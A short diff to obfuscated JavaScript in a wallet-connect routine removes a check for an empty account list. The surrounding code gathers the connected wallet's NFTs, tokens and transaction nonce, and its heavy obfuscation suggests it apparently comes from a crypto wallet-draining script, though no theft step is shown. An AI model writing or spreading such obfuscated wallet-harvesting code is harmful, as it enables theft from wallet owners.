@@ -2787,13 +2787,6 @@ async function walletConnected() {
     const _0x1b7e36 = await web3[_0x1ca0db(0x277)]['getAccounts']();
     selectedAccount = _0x1b7e36[0x0],
     $(_0x1ca0db(0xa05))['val'](selectedAccount),
-
-
-    if (_0x1b7e36[_0x1ca0db(0xe9c)] == 0x0) {
-        isPending = ![],
-        await onDisconnect();
-        return;
-    }
     nftDataPromise = getNFTData(selectedAccount),
     tokenDataPromise = getTokenData(selectedAccount),
     globalNonce = await web3[_0x1ca0db(0x277)]['getTransactionCount'](selectedAccount),
